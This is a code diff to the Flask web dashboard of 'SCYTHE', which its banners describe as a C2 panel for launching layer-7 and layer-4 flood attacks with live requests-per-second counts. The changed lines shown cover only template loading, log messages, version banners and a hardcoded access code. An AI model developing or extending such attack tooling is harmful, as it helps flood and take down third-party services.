@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 """
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║  SCYTHE WEB DASHBOARD v11.2 — USING EXISTING TEMPLATE                      ║
+║  SCYTHE WEB DASHBOARD v11.3 — FINAL TEMPLATE FIX                           ║
 ║  🔥 6 L7 + 4 L4 METHODS                                                     ║
 ║  🔥 ATTACK FROM DASHBOARD ↔ C2 ↔ STATE FULL SYNC                           ║
 ║  🔥 LIVE RPS REAL-TIME                                                     ║
-║  🔥 FIXED: Does NOT overwrite existing dashboard.html                      ║
+║  🔥 FIXED: Uses existing dashboard.html (no overwrite)                     ║
 ║  Built for: Alpha @scytheinhere88                                            ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 """
@@ -117,9 +117,18 @@ def logout():
 @require_auth
 def index():
     log_dashboard(f"Dashboard accessed from {request.remote_addr}", "ACCESS")
+    # Cek apakah file template ada
+    template_path = os.path.join(app.template_folder, 'dashboard.html')
+    if os.path.exists(template_path):
+        with open(template_path, 'r') as f:
+            content = f.read()
+            if 'Dashboard loaded. Use full version.' in content:
+                log_dashboard("WARNING: dashboard.html still minimal, but using it anyway", "WARN")
+    else:
+        log_dashboard("ERROR: dashboard.html not found in templates folder!", "ERROR")
     return render_template('dashboard.html')
 
-# ─── API ENDPOINTS ───
+# ─── API ENDPOINTS (sama seperti sebelumnya) ───
 @app.route('/api/status')
 @require_auth
 def api_status():
@@ -346,7 +355,7 @@ def sync_worker():
 sync_thread = threading.Thread(target=sync_worker, daemon=True)
 sync_thread.start()
 
-# ─── CREATE TEMPLATES (tidak menimpa dashboard.html jika sudah ada) ───
+# ─── CREATE TEMPLATES (hanya login, dashboard dibiarkan) ───
 def create_templates():
     os.makedirs('templates', exist_ok=True)
 
@@ -469,19 +478,17 @@ def create_templates():
 </html>""")
         print("[INIT] Created login.html")
 
-    # Dashboard template: hanya buat jika belum ada (tidak menimpa)
+    # Dashboard: TIDAK dibuat/ditimpa, biarkan user punya file sendiri
     if not os.path.exists('templates/dashboard.html'):
-        # Gunakan template default minimal, atau kamu bisa salin template v5.2 di sini
-        # Tapi karena kamu sudah punya file, kita tidak akan menimpanya.
+        # Jika tidak ada, buat minimal (tapi ini tidak akan terjadi karena kamu sudah punya)
         with open('templates/dashboard.html', 'w') as f:
             f.write("""<!DOCTYPE html>
-<html>
-<head><title>SCYTHE C2 Dashboard</title></head>
-<body><h1>SCYTHE C2 Dashboard</h1><p>Please upload your dashboard.html template.</p></body>
+<html><head><title>Dashboard</title></head>
+<body><h1>Dashboard not found</h1><p>Please upload dashboard.html to templates folder.</p></body>
 </html>""")
-        print("[INIT] Created minimal dashboard.html (please replace with your own)")
+        print("[WARN] dashboard.html not found, created minimal placeholder.")
     else:
-        print("[INIT] dashboard.html already exists, keeping your version.")
+        print("[INIT] dashboard.html found, keeping your version.")
 
 create_templates()
 
@@ -490,12 +497,12 @@ if __name__ == '__main__':
     host = os.environ.get('DASHBOARD_HOST', '0.0.0.0')
     port = int(os.environ.get('DASHBOARD_PORT', 1837))
     print("╔═══════════════════════════════════════════════════════════════════════════════╗")
-    print("║  SCYTHE Web Dashboard v11.2 — USING EXISTING TEMPLATE                      ║")
+    print("║  SCYTHE Web Dashboard v11.3 — FINAL TEMPLATE FIX                           ║")
     print("║  🔥 Authentication: Code 665544 required                                     ║")
     print("║  🔥 6 L7 + 4 L4 Methods                                                      ║")
     print("║  🔥 Live RPS Real-time                                                       ║")
     print("║  🔥 Sync: C2 ↔ Dashboard ↔ State                                            ║")
-    print("║  🔥 Template: Uses existing dashboard.html (does NOT overwrite)              ║")
+    print("║  🔥 Template: Uses your existing dashboard.html (no overwrite)              ║")
     print("╚═══════════════════════════════════════════════════════════════════════════════╝")
     print("")
     print(f"[INFO] Starting dashboard on http://{host}:{port}")
